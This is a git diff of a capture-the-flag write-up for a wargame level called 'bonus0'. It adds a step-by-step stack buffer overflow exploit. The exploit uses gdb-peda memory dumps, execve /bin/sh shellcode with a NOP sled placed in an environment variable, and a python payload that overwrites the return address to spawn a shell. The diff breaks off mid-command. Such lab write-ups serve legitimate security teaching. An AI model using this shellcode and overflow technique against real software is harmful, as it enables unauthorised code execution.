@@ -41,7 +41,20 @@ Lets debug the binary
 
 See our assembly interpretation in [source file](../source.c)
 
+We can see there is 2 prompts that read at most 4096. Then replace the first `\n` with a `\0`. And then extract 20 chars and concatenate them together.
+But if there is no `\n` is the first 20 characters, there is a problem.
+
+Lets check that together, what if we write exactly 20 chars.
+
 ```shell
+./bonus0
+   -
+  (stdin) AAAAAAAAAAAAAAAAAAA # 19 chars
+   -
+  (stdin) BBBBBBBBBBBBBBBBBBBB # 20 chars
+  > AAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB
+# It pass with 19 chars in the 1st prompt
+
 ./bonus0
   -
   (stdin) AAAAAAAAAAAAAAAAAAAA # 20 chars
@@ -49,47 +62,18 @@ See our assembly interpretation in [source file](../source.c)
   (stdin) BBBBBBBBBBBBBBBBBBBB # 20 chars
   > AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBB
   Segmentation fault (core dumped)
-
-./bonus0
-   -
-  (stdin) AAAAAAAAAAAAAAAAAAA # 19 chars
-   -
-  (stdin) BBBBBBBBBBBBBBBBBBBB # 20 chars
-  > AAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB
 ```
+
+It segfaults with 20 characters in the first buffer.
+
+Lets debug that.
 
 ```shell
-gdb-peda$ b*main+28 # before puts
-gdb-peda$ run
-  (stdin) AAAAAAAAAAAAAAAAAAA # 19 chars
-  (stdin) BBBBBBBBBBBBBBBBBBB # 19 chars
-gdb-peda$ x/100x $esp+0x16
-x/100x $esp+0x16
-  0xbffff626:   [ 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-  0xbffff62e:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
-  0xbffff636:     0x41    0x41    0x41    0x20    0x42    0x42    0x42    0x42
-  0xbffff63e:     0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
-  0xbffff646:     0x42    0x42    0x42    0x42    0x42    0x42    0x42 ]  0x00
-  0xbffff64e:     0xfd    0xb7  { 0xd0    0x85    0x04    0x08 }  0x00    0x00
-```
-
-There is an offset at 23 chars after second prompt.
-
-Finally we can get the pass !
-
-```shell
-$ whoami
-> bonus1
-$ cat /home/user/bonus0/.pass
->
-```
-
-```
-b*main+18
+gdb-peda$ b*main+18
   (stdin) ABCDEFGHIJKLMNOPQRSTUVWXYZ (A-T 20)
   (stdin) abcdefghijklmnopqrstuvwxyz
-run
-x/50x $esp+0x16
+gdb-peda$ run
+gdb-peda$ x/50x $esp+0x16
   0xbffff616:[0x44434241	0x48474645	0x4c4b4a49	0x504f4e4d
   0xbffff626:	0x54535251][0x64636261	0x68676665  0x6c6b6a69
   0xbffff636:	0x706f6e6d	0x74737271][0xb7fd0ff4][0x63626120
@@ -99,33 +83,80 @@ x/50x $esp+0x16
 # [A-T][a-t][0xb7fd0ff4][a-c]' '[d-s]
 # 20    20  4            3    1  16
 
-continue
-EIP: 0x6d6c6b6a ('jklm')
-Invalid $PC address: 0x6d6c6b6a
-Stopped reason: SIGSEGV
-0x6d6c6b6a in ?? ()
+gdb-peda$ continue
+  EIP: 0x6d6c6b6a ('jklm')
+  Invalid $PC address: 0x6d6c6b6a
+  Stopped reason: SIGSEGV
+  0x6d6c6b6a in ?? ()
 ```
 
+Since we injected 20 chars in the prompts, there is like an overflow and it tries to access to the address `0x6d6c6b6a` ('jklm').
+
+Maybe we could set a shellcode as environment variable, and redirect the code to the shellcode address.
+
+We set the shellcode environment variable:
+
+```shell
+export SHELLCODE=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
 ```
-export SHELLCODE=$(python -c 'print "\x90" * 0xff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
-```
+
+We get the shellcode address:
 
 ```shell
 gdb-peda$ searchmem SHELLCODE
   [stack] : 0xbffff864 ("SHELLCODE=1\300Ph//shh/bin\211\343PS\211\341\260\v̀")
 gdb-peda$ p 0xbffff864 + 10 # (length of "SHELLCODE=")
-$1 = 0xbffff86e
+  $1 = 0xbffff86e
+```
 
+Then we replace the part "jklm" in the second prompt with the shellcode address :
 
-ABCDEFGHIJKLMNOPQRSTUVWXYZ
-abcdefghi\x6e\xf8\xff\xbf
+```shell
+# First prompt: A * 4095 + '\n' (=> to fill exactly the first prompt)
+# Second prompt: abcdefghi\x6e\xf8\xff\xbfnopqrstuvwxyz
 
 python -c 'print "A" * 4095 + "\n" + "abcdefghi" + "\x6e\xf8\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10
+```
 
-python -c 'print "A" * 4095 + "\n" + "abcdefghi" + "\x76\xf8\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10
+Lets try in gdb
+
+```shell
+gdb-peda$ run < /tmp/exploit10
+  AAAAAAAAAAAAAAAAAAAAabcdefghivnopqrst abcdefghivnopqrst
+> process 6716 is executing new program: /bin/dash
+```
+
+It seems that works, lets try directly with the binary:
+
+```shell
+cat /tmp/exploit10 - | ~/bonus0
+  AAAAAAAAAAAAAAAAAAAAabcdefghivnopqrst abcdefghivnopqrst
+id
+> Segmentation fault (core dumped)
+```
+
+Unfortunately, it works perfectly with gdb but not out of debugger.
+
+In this [post](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it), the first contributor argues _"the stack addresses in the debugger may not match the addresses during normal execution"_.
+
+So maybe our shellcode address is not exact.
+
+Another contributor advices us to put some NOP Sled before our malicious code.
+
+We will modify our shellcode and put some NOP Sled before the shellcode to approximate the exact shellcode address.
+
+```bash
+export SHELLCODE=$(python -c 'print "\x90" * 0xff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
 ```
 
 ```shell
+gdb-peda$ searchmem SHELLCODE
+  [stack] : 0xbffff764 ("SHELLCODE=1\300Ph//shh/bin\211\343PS\211\341\260\v̀")
+gdb-peda$ p 0xbffff764 + 10 # (length of "SHELLCODE=")
+  $1 = 0xbffff76e
+
+python -c 'print "A" \* 4095 + "\n" + "abcdefghi" + "\x76\xf8\xff\xbf" + "nopqrstuvwxyz"' > /tmp/exploit10
+
 cat /tmp/exploit10 - | ~/bonus0
    -
    -
